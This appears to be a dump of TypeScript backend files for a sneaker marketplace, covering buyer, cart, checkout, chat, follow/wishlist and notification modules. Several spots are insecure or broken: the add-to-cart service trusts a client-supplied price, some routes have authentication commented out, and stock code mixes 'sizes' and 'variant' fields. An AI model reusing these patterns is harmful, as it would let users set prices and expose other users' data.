    isRestockInMyShoeSize: boolean;
    isNearbyStoreAlert: boolean;
    isFollowStoreDrops: boolean;
    isPriceDrop: boolean;
    isWantedPairAlert: boolean;
    isGoSneakerAnnouncement: boolean;
  };
  privacy: {
    isProfileVisiblityPublic: boolean;
    isWishListPublic: boolean;
    isPurchaseHistoryPublic: boolean;
    isLockerCollectionPublic: boolean;
    isVipStatusPublic: boolean;
    isActivityPublic: boolean;
  }
  myReviews: number;
  subscription: Types.ObjectId;
  subscriptionStartDate: Date;
  subscriptionEndDate: Date;
  discoveryRadius: number;
  createdAT: Date;
}


export interface IBuyerNotification {
  isRestockInMyShoeSize: boolean;
  isNearbyStoreAlert: boolean;
  isFollowStoreDrops: boolean;
  isPriceDrop: boolean;
  isWantedPairAlert: boolean;
  isGoSneakerAnnouncement: boolean;
}
// Reseller Interface
```

## File: src/app/module/Buyer/Buyer.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IBuyer } from "./Buyer.interface";

const BuyerSchema = new Schema<IBuyer>({
    auth: { type: Schema.Types.ObjectId, required: true, ref: "Auth" },
    name: { type: String, required: true },
    phone: { type: String, default: "" },
    image: { type: String, default: "" },
    email: { type: String, required: true, unique: true },
    bio: { type: String, default: "" },
    membershipStatus: { type: String, default: "" },
    shoeSize: { type: Number, default: 0 },
    selectedShoeSize: [{
        label: { type: String, default: "" },
        size: { type: Number, default: 0 }
    }],
    brands: { type: [String], default: [] },
    location: {
        type: {
            type: String,
            enum: ["Point"],
            default: "Point",
        },
        coordinates: {
            type: [Number],
            default: [0, 0],
        },
    },
    address: { type: String,default:"" },
    notification: { 
        isRestockInMyShoeSize: { type: Boolean, default: false },
        isNearbyStoreAlert: { type: Boolean, default: false },
        isFollowStoreDrops: { type: Boolean, default: false },
        isPriceDrop: { type: Boolean, default: false },
        isWantedPairAlert: { type: Boolean, default: false },
        isGoSneakerAnnouncement: { type: Boolean, default: false },
    },
    privacy: {
        isProfileVisiblityPublic: { type: Boolean, default: true },
        isWishListPublic: { type: Boolean, default: true },
        isPurchaseHistoryPublic: { type: Boolean, default: true },
        isLockerCollectionPublic: { type: Boolean, default: true },
        isVipStatusPublic: { type: Boolean, default: true },
        isActivityPublic: { type: Boolean, default: true },
    },
    myReviews:{type:Number,default:0},
    subscription:{type:Schema.Types.ObjectId,ref:"Subscription"},
    subscriptionStartDate:{type:Date},
    subscriptionEndDate:{type:Date},
}, { timestamps: true });

//to enable geospatial queries on the location field, we need to create a 2dsphere index on it. This allows us to perform queries like finding nearby buyers based on their location.
BuyerSchema.index({ location: "2dsphere"});

const BuyerModel = models.Buyer || model<IBuyer>("Buyer", BuyerSchema);

export default BuyerModel;
```

## File: src/app/module/Cart/Cart.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { ICart } from "./Cart.interface";
import { ENUM_CART_STATUS } from "../../../utilities/enum";

const CartSchema = new Schema<ICart>({
   buyerId: { type: Schema.Types.ObjectId, ref: "Buyer", required: true },
   productId: { type: Schema.Types.ObjectId, ref: "Product", required: true },
   retailerId: { type: Schema.Types.ObjectId, ref: "Retailer", required: true },
   unitPrice: { type: Number, required: true },
   quantity: { type: Number, required: true },
   totalPrice: { type: Number, required: true },
   selectedSize: { type: Number, required: true },
   status: { type: String, enum: Object.values(ENUM_CART_STATUS), default: ENUM_CART_STATUS.ACTIVE },
}, { timestamps: true });

CartSchema.index({
    buyerId: 1,
    productId: 1,
    selectedSize: 1,
}, { unique: true });

const CartModel = models.Cart || model<ICart>("Cart", CartSchema);

export default CartModel;
```

## File: src/app/module/Cart/Cart.service.ts
```typescript
import mongoose from "mongoose";
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import { ENUM_CART_STATUS, ENUM_PRODUCT_AVAILABILITY, ENUM_PAYMENT_METHOD, ENUM_ORDER_ITEM_STATUS, ENUM_ORDER_STATUS, ENUM_ORDER_TYPE, ENUM_PAYMENT_STATUS } from "../../../utilities/enum";
import {ProductModel} from "../Product/Product.model";
import { ICart, TCartItem } from "./Cart.interface";
import CartModel from "./Cart.model";
import { profile } from "console";
import { OrderItemModel, OrderModel } from "../Order/Order.model";

const addToCartService = async (userDetails: IJwtPayload, payload: TCartItem) => {

    const { profileId } = userDetails;

    const { productId, quantity, unitPrice, selectedSize } = payload;

    if (!quantity || quantity < 1) {
        throw new Error("Quantity must be at least 1");
    }

    const product:any = await ProductModel.findById(productId).lean();

    if (!product) {
        throw new Error("Product not found to add to cart");
    }

    // if (product.availability !== ENUM_PRODUCT_AVAILABILITY.ACTIVE ) {
    //     throw new Error("Product is not active");
    // }

    const sizeInfo = product.variant?.find(
        (item: any) => item.size === selectedSize
    );

    if (!sizeInfo) {
        throw new Error("Selected size is not available");
    }

    // const availableStock = sizeInfo.stock - (sizeInfo.reservedStock || 0);
    const availableStock = sizeInfo.stock;

    const existingCartItem = await CartModel.findOne({
        buyerId: profileId,
        productId,
        selectedSize,
        status: ENUM_CART_STATUS.ACTIVE,
    });

    // const finalQuantity = existingCartItem
    //     ? existingCartItem.quantity + quantity
    //     : quantity;

    // if (availableStock < finalQuantity) {
    //     throw new Error(`Only ${availableStock} items are available for this size`);
    // }

    // const unitPrice = product.price;
    const totalPrice = unitPrice * quantity;

    let cartItem;

    // if (existingCartItem) {
    //     existingCartItem.quantity = finalQuantity;
    //     existingCartItem.unitPrice = unitPrice;
    //     existingCartItem.totalPrice = totalPrice;

    //     cartItem = await existingCartItem.save();
    // } else {
        cartItem = await CartModel.create({
        buyerId: profileId,
        productId,
        retailerId: product.retailerId,
        selectedSize,
        quantity,
        unitPrice,
        totalPrice: unitPrice * quantity,
        status: ENUM_CART_STATUS.ACTIVE,
        });
    // }

    return cartItem;

    // // Check if the product is already in the cart
    // const existingCartItem = await CartModel.findOne({ buyerId: profileId, retailerId, productId });

    // if (existingCartItem) {
    //     throw new ApiError(400, "This product is already in your cart.");
    // }

    // // Fetch product details to get unit price and available sizes
    // // Assuming you have a ProductModel to fetch product details
    // // const productDetails = await ProductModel.findById(productId);

    // // if (!productDetails) {
    // //     throw new ApiError(404, "Product not found.");
    // // }

    // // const unitPrice = productDetails.price; // Assuming price is a field in product details
    // // const selectedSize = payload.selectedSize; // Assuming selected size is passed in payload
    // const totalPrice = unitPrice * quantity;

    // // Create a new cart item
    // const newCartItem = await CartModel.create({
    //     buyerId: profileId,
    //     retailerId,
    //     productId,
    //     // unitPrice,
    //     quantity,
    //     totalPrice,
    //     selectedSize,
    // });

    // if(!newCartItem){
    //     throw new ApiError(500, "Failed to add product to cart.");
    // }
    
    return null;

};

const getMyCartService = async (buyerId: string) => {
  const cartItems = await CartModel.find({
    buyerId,
    status: ENUM_CART_STATUS.ACTIVE,
  })
    .populate({path:"productId", select:"name price images brand color styleCode variant"})
    .populate({path:"retailerId", select:"name"})
    .sort({ createdAt: -1 });

  const subtotal = cartItems.reduce((sum, item) => {
    return sum + item.totalPrice;
  }, 0);

  const totalItems = cartItems.reduce((sum, item) => {
    return sum + item.quantity;
  }, 0);

  return {
    cartItems,
    summary: {
      subtotal,
      totalItems,
    },
  };
};

const deleteCartItemService = async (userDetails: IJwtPayload, cartItemId: string) => {
    
    const { profileId } = userDetails;
    
    // const cartItem = await CartModel.findOne({ _id: cartItemId, buyerId: profileId });
    
    // if (!cartItem) {
        //     throw new ApiError(404, "Cart item not found.");
        // }
        
        // await CartModel.deleteOne({ _id: cartItemId });
        
    //instead of deleting the cart item, we can just update the status to "Removed" so that we can keep the record for future reference and analytics
     const cartItem = await CartModel.findOneAndUpdate(
    {
      _id: cartItemId,
      buyerId: profileId,
      status: ENUM_CART_STATUS.ACTIVE,
    },
    {
      status: ENUM_CART_STATUS.REMOVED,
    },
    {
      new: true,
    }
  );


    return null;

};

const increaseCartItemQuantityService = async (userDetails: IJwtPayload, payload: { cartItemId: string, quantity: number }) => {

    const { profileId } = userDetails;
    const { cartItemId, quantity } = payload;
    // const cartItem = await CartModel.findOne({ _id: cartItemId, buyerId: profileId });

    // if (!cartItem) {
    //     throw new ApiError(404, "Cart item not found to increase quantity.");
    // }

    // cartItem.quantity += 1;
    // cartItem.totalPrice = cartItem.unitPrice * cartItem.quantity;

    // await cartItem.save();

    // return null;

    if (!quantity || quantity < 1) {
        throw new Error("Quantity must be at least 1");
    }

    const cartItem = await CartModel.findOne({
        _id: cartItemId,
        buyerId:profileId,
        status: ENUM_CART_STATUS.ACTIVE,
    });

    if (!cartItem) {
        throw new Error("Cart item not found");
    }

    const product = await ProductModel.findById(cartItem.productId);

    if (!product) {
        throw new Error("Product not found");
    }

    const sizeInfo = product.sizes?.find(
        (item: any) => item.size === cartItem.selectedSize
    );

    if (!sizeInfo) {
        throw new Error("Selected size is no longer available");
    }

    const availableStock = sizeInfo.stock - (sizeInfo.reservedStock || 0);

    if (availableStock < quantity) {
        throw new Error(`Only ${availableStock} items are available`);
    }

    cartItem.quantity = quantity;
    cartItem.unitPrice = product.price;
    cartItem.totalPrice = product.price * quantity;

    await cartItem.save();

    return cartItem;

};

const applypromoCodeService = async (userDetails: IJwtPayload, query: Record<string, unknown>) => {

    const { profileId } = userDetails;

    let totalPriceSum = 0;

    // Validate promo code and calculate discount
    
    // This is a placeholder implementation, you should replace it with your actual promo code validation logic
    const discountpercent = 10; // Assuming a flat $10 discount for demonstration

    // Fetch all cart items for the user
    const cartItems = await CartModel.find({ buyerId: profileId, status: ENUM_CART_STATUS.ACTIVE });

    if (cartItems.length === 0) {
        throw new ApiError(400, "No items in the cart to apply promo code.");
    }

    // Apply discount to all totalPrice at a time, you can modify this logic to apply discount based on your requirements
    for (const item of cartItems) {
        totalPriceSum += item.totalPrice;
    }

    const discountedTotalPrice = totalPriceSum - (totalPriceSum * discountpercent / 100);

    return  discountedTotalPrice ;

}

const placeOrderFromCartService = async (userDetails: IJwtPayload,payload: {totalPrice: number,shippingFee: number}) => {

    const { profileId } = userDetails;

    // Fetch all cart items for the user
    const cartItems = await CartModel.find({ buyerId: profileId, status: ENUM_CART_STATUS.ACTIVE });

    if (cartItems.length === 0) {
        throw new ApiError(400, "No items in the cart to place an order.");
    }

    // Here you can implement the logic to create orders based on the cart items
    // For example, you can loop through the cart items and create an order for each item or group them into a single order

    // After placing the order(s), you can update the cart items' status to "Ordered" or remove them from the cart
    await CartModel.updateMany({ buyerId: profileId, status: ENUM_CART_STATUS.ACTIVE }, { status: ENUM_CART_STATUS.ORDERED });  

    return null;

}


type TShippingAddress = {
  name: string;
  phone: string;
  address: string;
  city: string;
  area?: string;
  lat: number;
  lng: number;
};

type TCheckoutCartPayload = {
//   buyerId: string;
  shippingAddress: TShippingAddress;
  pickupTime: Date;
  paymentMethod: string;
};

const calculateShippingCharge = ({
  subtotal,
  shippingAddress,
}: {
  subtotal: number;
  shippingAddress: any;
}) => {
  if (subtotal >= 5000) {
    return 0;
  }

  if (shippingAddress.city === "Dhaka") {
    return 80;
  }

  return 150;
};

export const generateOrderNumber = () => {
  const timestamp = Date.now();
  const random = Math.floor(1000 + Math.random() * 9000);

  return `ORD-${timestamp}-${random}`;
};

const checkoutAllCartItemsService = async (userDetails: IJwtPayload, payload: TCheckoutCartPayload) => {

    const {profileId} = userDetails;

    const { shippingAddress, pickupTime, paymentMethod } = payload;

  const session = await mongoose.startSession();

  try {
    session.startTransaction();

    const cartItems = await CartModel.find({
      buyerId: profileId,
      status: ENUM_CART_STATUS.ACTIVE,
    }).session(session);

    if (!cartItems.length) {
      throw new ApiError(400, "Cart is empty. Cannot proceed to checkout.");
    }

    let subtotal = 0;
    let totalItems = 0;

    const orderItemsPayload = [];

    for (const cartItem of cartItems) {
      const product = await ProductModel.findById(cartItem.productId).session(session);

      if (!product) {
        throw new ApiError(400, "One or more products are no longer available");
      }

    //   if (!product.isActive) {
    //     throw new ApiError(400, `${product.name} is no longer active`);
    //   }

      const sizeInfo = product.variant?.find(
        (item: any) => item.size === cartItem.selectedSize
      );

      if (!sizeInfo) {
        throw new ApiError(400, `${product.name} selected size is no longer available`);
      }

    //   const availableStock = sizeInfo.stock - (sizeInfo.reservedStock || 0);
         const availableStock = sizeInfo.stock;

      if (availableStock < cartItem.quantity) {
        throw new ApiError(400, `Only ${availableStock} items available for ${product.name}, size ${cartItem.selectedSize}`);
      }

      const unitPrice = product.price;
      const totalPrice = unitPrice * cartItem.quantity;

      subtotal += totalPrice;
      totalItems += cartItem.quantity;

      orderItemsPayload.push({
        buyerId:profileId,
        retailerId: cartItem.retailerId,
        productId: product._id,
        productSnapshot: {
          name: product.name,
          image: product.images?.[0] || product.image,
          brand: product.brand,
        },
        selectedSize: cartItem.selectedSize,
        quantity: cartItem.quantity,
        unitPrice,
        totalPrice,
        pickupTime,
        status: ENUM_ORDER_ITEM_STATUS.PLACED,
      });

      /**
       * Reserve stock during checkout.
       * This prevents another buyer from purchasing the same stock
       * while payment is pending.
       */
      const updatedProduct = await ProductModel.findOneAndUpdate(
        {
          _id: product._id,
          "variant.size": cartItem.selectedSize,
          $expr: {
            $gte: [
              {
                $subtract: [
                  {
                    $getField: {
                      field: "stock",
                      input: {
                        $arrayElemAt: [
                          {
                            $filter: {
                              input: "$sizes",
                              as: "s",
                              cond: {
                                $eq: ["$$s.size", cartItem.selectedSize],
                              },
                            },
                          },
                          0,
                        ],
                      },
                    },
                  },
                  {
                    $ifNull: [
                      {
                        $getField: {
                          field: "reservedStock",
                          input: {
                            $arrayElemAt: [
                              {
                                $filter: {
                                  input: "$sizes",
                                  as: "s",
                                  cond: {
                                    $eq: ["$$s.size", cartItem.selectedSize],
                                  },
                                },
                              },
                              0,
                            ],
                          },
                        },
                      },
                      0,
                    ],
                  },
                ],
              },
              cartItem.quantity,
            ],
          },
        },
        {
          $inc: {
            "sizes.$.reservedStock": cartItem.quantity,
          },
        },
        {
          new: true,
          session,
        }
      );

      if (!updatedProduct) {
        throw new Error(
          `Stock changed while checking out ${product.name}. Please try again.`
        );
      }
    }

    const shippingCharge = calculateShippingCharge({
      subtotal,
      shippingAddress,
    });

    const discountAmount = 0;

    const totalAmount = subtotal + shippingCharge - discountAmount;

    const holdingTime = 15; // minutes
    const holdingStartTime = new Date();
    const holdingEndTime = new Date(
      holdingStartTime.getTime() + holdingTime * 60 * 1000
    );

    const order = await OrderModel.create(
      [
        {
          buyerId:profileId,
          orderNumber: generateOrderNumber(),

          subtotal,
          shippingCharge,
          discountAmount,
          totalAmount,
          totalItems,

          orderStatus: ENUM_ORDER_STATUS.PLACED,
          orderType: ENUM_ORDER_TYPE.BUY_NOW,
          paymentStatus: ENUM_PAYMENT_STATUS.PENDING,
          paymentMethod,

          shippingAddress,

          holdingTime,
          holdingStartTime,
          holdingEndTime,

          pickupTime,
        },
      ],
      { session }
    );

    const orderId = order[0]._id;

    const finalOrderItemsPayload = orderItemsPayload.map((item) => ({
      ...item,
      orderId,
    }));

    await OrderItemModel.insertMany(finalOrderItemsPayload, { session });

    await CartModel.updateMany(
      {
        buyerId: profileId,
        status: ENUM_CART_STATUS.ACTIVE,
        _id: {
          $in: cartItems.map((item) => item._id),
        },
      },
      {
        status: ENUM_CART_STATUS.ORDERED,
      },
      { session }
    );

    await session.commitTransaction();

    return {
      order: order[0],
      message: "Cart checkout created successfully. Continue payment.",
    };
  } catch (error) {
    await session.abortTransaction();
    throw error;
  } finally {
    session.endSession();
  }
};


const confirmCartOrderPaymentService = async (orderId: string) => {
  const session = await mongoose.startSession();

  try {
    session.startTransaction();

    const order = await OrderModel.findById(orderId).session(session);

    if (!order) {
      throw new Error("Order not found");
    }

    if (order.paymentStatus === ENUM_PAYMENT_STATUS.PAID) {
      await session.commitTransaction();
      return order;
    }

    const orderItems = await OrderItemModel.find({ orderId }).session(session);

    for (const item of orderItems) {
      await ProductModel.updateOne(
        {
          _id: item.productId,
          "variant.size": item.selectedSize,
        },
        {
          $inc: {
            "variant.$.stock": -item.quantity,
            "variant.$.reservedStock": -item.quantity,
          },
        },
        { session }
      );
    }

    order.paymentStatus = ENUM_PAYMENT_STATUS.PAID;
    order.orderStatus = ENUM_ORDER_STATUS.PLACED;

    await order.save({ session });

    await session.commitTransaction();

    return order;
  } catch (error) {
    await session.abortTransaction();
    throw error;
  } finally {
    session.endSession();
  }
};

const CartServices = { 
    addToCartService,
    deleteCartItemService,
    increaseCartItemQuantityService,
    applypromoCodeService,
    placeOrderFromCartService
};

export default CartServices;
```

## File: src/app/module/Chat/Chat.service.ts
```typescript
import mongoose from "mongoose";
import { ConversationModel, MessageModel } from "./Chat.model";
import { getIO } from "../../../socket/socket.connection";
import ApiError from "../../../error/ApiError";
import UserModel from "../User/User.model";
// import notification from "../../../helper/sendNotification";
import { ENUM_NOTIFICATION_TYPE } from "../../../utilities/enum";
import { emitResult } from "../../../socket/emitResult";
import notification from "../../../helper/notification";

//send request
export const sendConversationRequest = async (
  senderId: string,
  receiverId: string
) => {

  const existing = await ConversationModel.findOne({
    participants: { $all: [senderId, receiverId] }
  });

  if (existing) return existing;

  const conversation = await ConversationModel.create({
    participants: [senderId, receiverId],
    status: "Accepted"
  });

  const io = getIO();

  //send response to receiver
  io.to(receiverId).emit("new_conversation_request", emitResult({
        statusCode: 201,
        success: true,
        message: `You have received a new conversation request`,
        data: conversation,
      }));
  //send response to
  io.to(senderId).emit("new_conversation_request", emitResult({
        statusCode: 201,
        success: true,
        message: `You have requested for a new conversation .`,
        data: conversation,
      }));

  //send a notification
  await notification.createNotification({
      toId: receiverId as string,
      toModel: "Buyer",
      title: `A reseller started a new conversation.`,
      type: ENUM_NOTIFICATION_TYPE.STARTED_CONVERSATION,
      referenceId: conversation?._id,
      referenceModel: "Conversation",
      metadata: {}
  });

  return conversation;
};

//get all request
// export const getConversationRequests = async (userId: string) => {

//   const io = getIO();

//   const requests = await ConversationModel.find({
//     participants: userId,
//     status: "Pending"
//   }).populate("participants", "name profileImage");


//   //send response to receiver
//   io.to(userId).emit("conversation_requests", emitResult({
//         statusCode: 200,
//         success: true,
//         message: `You have retrieved all conversation requests.`,
//         data: requests,
//       }));

//   return requests;
// };

//accept request
// export const acceptConversationRequest = async (conversationId: string) => {

//   const conversation = await ConversationModel.findByIdAndUpdate(
//     conversationId,
//     { status: "Accepted" },
//     { new: true }
//   );

//   const io = getIO();

//   conversation?.participants.forEach((userId: string) => {
//     io.to(userId.toString()).emit("conversation_accepted", emitResult({
//         statusCode: 200,
//         success: true,
//         message: `You have accepted a new conversation request.`,
//         data: conversation,
//       }));
//   });

//   //send response to receiver
//   // io.to(conversation.participants[1]).emit("conversation_accepted", emitResult({
//   //       statusCode: 200,
//   //       success: true,
//   //       message: `You have accepted a new conversation request.`,
//   //       data: conversation,
//   //     }));

//   //send a notification
//   await notification.createNotification({
//       toId: conversation.participants[0] as string,
//       toModel: "User",
//       title: `User accepted your conversation request.`,
//       type: ENUM_NOTIFICATION_TYPE.ACCEPT_WAVE,
//       referenceId: conversation?._id,
//       referenceModel: "Conversation"
//   });

//   return conversation;
// };

//get chatlist
export const getChatList = async (userId: string) => {
    try {
        
        const chats = await ConversationModel.aggregate([
          {
            $match: {
              participants: new mongoose.Types.ObjectId(userId),
            },
          },
          {
            $lookup: {
              from: "users",
              localField: "participants",
              foreignField: "_id",
              as: "users",
            },
          },
          {
            $lookup: {
              from: "messages",
              localField: "lastMessage",
              foreignField: "_id",
              as: "lastMessage",
            },
          },
          {
            $unwind: {
              path: "$lastMessage",
              preserveNullAndEmptyArrays: true,
            },
          },
          {
            $addFields: {
              otherUser: {
                $filter: {
                  input: "$users",
                  as: "user",
                  cond: {
                    $ne: ["$$user._id", new mongoose.Types.ObjectId(userId)],
                  },
                },
              },
            },
          },
          {
            $unwind: "$otherUser",
          },
          {
            $sort: {
              updatedAt: -1,
            },
          },
          {
            $project: {
              _id: 1,
              "otherUser.name": 1,
              "otherUser.image": 1,
              lastMessage: "$lastMessage.text",
              time: "$lastMessage.createdAt",
            },
          },
        ]);
      
        return chats;
        
    } catch (error) {
        console.log(error);
        throw new ApiError(500,"Error in get chat list.");
    }

};

//get all message from user
export const getMessages = async (conversationId: string) => {

    try {   
        const messages = await MessageModel.find({
          conversationId,
        }).sort({ createdAt: 1 });
      
        return messages;
    } catch (error) {
        console.log(error);
        console.log(500,"Error In get all message.");
    }

};

//search user by name
// export const searchUsers = async (search: string) => {
//   const users = await UserModel.find({
//     name: { $regex: search, $options: "i" },
//   }).select("name image");

//   return users;
// };

//send new message service function
export const sendMessage = async ( senderId: string,receiverId: string,text: string ) => {

    try {
        
        let conversation = await ConversationModel.findOne({
          participants: { $all: [senderId, receiverId] },
          status: "Accepted"
        });
        
        //create conversation if not available
        if (!conversation) {
          conversation = await ConversationModel.create({
            participants: [senderId, receiverId],
          });
      
          if(!conversation){
              throw new ApiError(500,"Failed to create new conversation.");
          }
      
        }
      
        const message = await MessageModel.create({
          conversationId: conversation._id,
          sender: senderId,
          receiver: receiverId,
          text,
        });
      
        conversation.lastMessage = message._id;
        await conversation.save();
      
        const io = getIO();
      
        //send message to both user
        io.to(receiverId).emit("new_message", emitResult({
          statusCode: 201,
          success: true,
          message: `You have received a new message.`,
          data: message,
        }));
        // io.to(senderId).emit("new_message", message);
      
        // update chat list
        // const senderChats = await getChatList(senderId);
        // const receiverChats = await getChatList(receiverId);
      
        // io.to(senderId).emit("chat_list", senderChats);
        // io.to(receiverId).emit("chat_list", receiverChats);
      
        return message;
    } catch (error) {
        console.log(error);
        throw new ApiError(500,"Send new message error.");
    }

};
```

## File: src/app/module/Engagement/Engagement.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import EngagementServices from "./Engagement.service";


//follow retailer

const followRetailerController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await EngagementServices.followRetailerService(user, req.params.id);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Retailer followed successfully.",
        data: result,
    });
});

const unfollowRetailerController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await EngagementServices.unfollowRetailerService(user, req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retailer unfollowed successfully.",
        data: result,
    });
});

//follow user

const followUser = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await EngagementServices.followUserService(user, req.params.id);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Followed successfully.",
        data: result,
    });
});

const getNearbyUser = catchAsync(async (req, res) => {

    // const { user } = req as AuthRequest;

    const result = await EngagementServices.getNearbyUser(req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved all nearby user.",
        data: result,
    });
});

const getAllFollowing = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await EngagementServices.getAllFollowingUser(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved all following user.",
        data: result,
    });
});

const getAllFollower = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await EngagementServices.getAllFollower(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved all followers.",
        data: result,
    });
});

const getFollowUserDetailsController = catchAsync(async (req, res) => {

    // const { user } = req as AuthRequest;

    const result = await EngagementServices.getFollowUserDetails( req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved user details.",
        data: result,
    });
});

//wishlist

const addToWishlistController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await EngagementServices.addToWishlistService(user, req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Product added to wishlist successfully.",
        data: result,
    });
});

const addToWantedlistController = catchAsync(async (req, res) => {

    // const { user } = req as AuthRequest;

    const result = await EngagementServices.addToWantedlistService(req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Product marked as wanted successfully.",
        data: result,
    });
});

const removeFromWishlistController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await EngagementServices.removeFromWishlistService(req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Product removed from wishlist successfully.",
        data: result,
    });
});
const addReviewController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await EngagementServices.addReviewService(user, req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Review added successfully.",
        data: result,
    });
});

const EngagementController = { 
    followRetailerController,
    unfollowRetailerController,

    followUser,
    getNearbyUser,
    getAllFollower,
    getAllFollowing,
    getFollowUserDetailsController,

    addToWishlistController,
    addToWantedlistController,
    removeFromWishlistController,
    addReviewController
};



export default EngagementController;
```

## File: src/app/module/Engagement/Engagement.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import EngagementValidations from "./Engagement.validation";
import EngagementController from "./Engagement.controller";


const EngagementRouter = express.Router();

//follow retailer

EngagementRouter.post(
    "/follow-retailer/:id",
    authorizeUser,
    // validateRequest(EngagementValidations.followRetailerZodSchema),
    EngagementController.followRetailerController   
);

EngagementRouter.post(
    "/unfollow-retailer/:id",
    authorizeUser,
    // validateRequest(EngagementValidations.followRetailerZodSchema),
    EngagementController.unfollowRetailerController   
);

//follow user

EngagementRouter.post(
    "/follow-user/:id",
    authorizeUser,
    // validateRequest(EngagementValidations.addToWishListValidation),
    EngagementController.followUser   
);

EngagementRouter.get(
    "/get-nearby-user",
    // authorizeUser,
    validateRequest(EngagementValidations.validateLatLongTofilterNearbyUsers),
    EngagementController.getNearbyUser   
);

EngagementRouter.get(
    "/get-all-follower",
    authorizeUser,
    // validateRequest(EngagementValidations.addToWishListValidation),
    EngagementController.getAllFollower   
);

EngagementRouter.get(
    "/get-all-following",
    authorizeUser,
    // validateRequest(EngagementValidations.addToWishListValidation),
    EngagementController.getAllFollowing   
);

EngagementRouter.post(
    "/get-follow-user-details/:id",
    // authorizeUser,
    // validateRequest(EngagementValidations.addToWishListValidation),
    EngagementController.getFollowUserDetailsController   
);

//wishlist

EngagementRouter.post(
    "/add-to-wishlist",
    authorizeUser,
    validateRequest(EngagementValidations.addToWishListValidation),
    EngagementController.addToWishlistController   
);

EngagementRouter.post(
    "/add-to-wantedlist/:id",
    authorizeUser,
    // validateRequest(EngagementValidations.followRetailerZodSchema),
    EngagementController.addToWantedlistController   
);
EngagementRouter.post(
    "/remove-from-wishlist/:id",
    authorizeUser,
    // validateRequest(EngagementValidations.followRetailerZodSchema),
    EngagementController.removeFromWishlistController   
);

EngagementRouter.post(
    "/add-review",
    authorizeUser,
    // validateRequest(EngagementValidations.followRetailerZodSchema),
    EngagementController.addReviewController   
);

export default EngagementRouter;
```

## File: src/app/module/Engagement/Engagement.validation.ts
```typescript
import { z } from "zod";

        
const addToWishListValidation = z.object({
    query: z.object({
        productId: z.string().length(24, "Invalid product ID"),
        retailerId: z.string().length(24, "Invalid retailer ID")
    }),
});

const validateLatLongTofilterNearbyUsers = z.object({
    query: z.object({
            latitude: z
                .number()
                .refine((value) => value >= -90 && value <= 90, {
                     message: "Latitude must be between -90 and 90",
                }),
        // .optional(),

            longitude: z
            .number()
            .refine((value) => value >= -180 && value <= 180, {
                message: "Longitude must be between -180 and 180",
            })
    }),
});

const EngagementValidations = { 
    addToWishListValidation ,
    validateLatLongTofilterNearbyUsers
};

export default EngagementValidations;
```

## File: src/app/module/Notification/Notification.interface.ts
```typescript
import { Types } from "mongoose";

export interface INotification {
    toId : Types.ObjectId;
    toModel: string;
    title :string;
    description: string;  
    type: string;
    referenceId?: Types.ObjectId;
    referenceModel?: string;
    metaData: {};
    isSeen: boolean;
}

export interface IAdminNotification {
    title :string;
    // details: string;  
    isSeen: boolean;
}

export type INotificationPayload = {
    toId?: string;   // optional field
    title: string;
};
```

## File: src/app/module/Notification/Notification.model.ts
```typescript
import { model, models, Schema } from "mongoose";
import { INotification,IAdminNotification } from "./Notification.interface";
import { ENUM_NOTIFICATION_TYPE } from "../../../utilities/enum";

// const NotificationSchema = new Schema<INotification>({
//     toId: { type: Schema.Types.ObjectId, required: true, ref: "Customer" },
//     title: { type: String, required: true },
//     // details: { type: String, required: true },
//     //route: { type: String, required: true },
//     isSeen: { type: Boolean, default: false },
// }, { timestamps: true });

const NotificationSchema = new Schema<INotification>({
    toId: { type: Schema.Types.ObjectId, required: true, refPath: "toModel" },
    toModel: {
        type: String,
        enum: ["Customer", "Supplier", "Admin"],
        required: true
    },
    title: { type: String, required: true },
    description: { type: String },
    type: {
        type: String,
        enum: Object.values(ENUM_NOTIFICATION_TYPE),
        required: true
    },

    referenceId: {
        type: Schema.Types.ObjectId
    },

    referenceModel: {
        type: String
    },

    metaData: {
        type: Object,
        default: {}
    },
    
    isSeen: { type: Boolean, default: false },
}, { timestamps: true });


const AdminNotificationSchema = new Schema<IAdminNotification>({
    title: { type: String, required: true },
    isSeen: { type: Boolean, default: false },
}, { timestamps: true });

const NotificationModel = models.Notification || model<INotification>("Notification", NotificationSchema);

const AdminNotificationModel = models.AdminNotification || model<IAdminNotification>("AdminNotification", AdminNotificationSchema);


export { NotificationModel, AdminNotificationModel}
```

## File: src/app/module/Pairs/Pairs.validation.ts
```typescript
import { z } from "zod";


const VariantSchema = z.object({
  gender: z.enum(["Men", "Women", "Kids"]),
  size: z.string().min(1, "Size is required"),
  stock: z.number().int().min(0, "Stock cannot be negative"),
});

export const CreateProductSchema = z.object({
  variant: z
    .array(VariantSchema)
    .min(1, "At least one variant is required"),
});

const addnewPairValidationSchema = z.object({
    body: z.object({
        name: z.string().min(1, "Name is required"),
        type: z.string().min(1, "Pair type is required."),
        brand: z.string().min(1, "Brand is required"),
        styleCode: z.string().min(1, "Style code is required"),
        details: z.string().optional(),
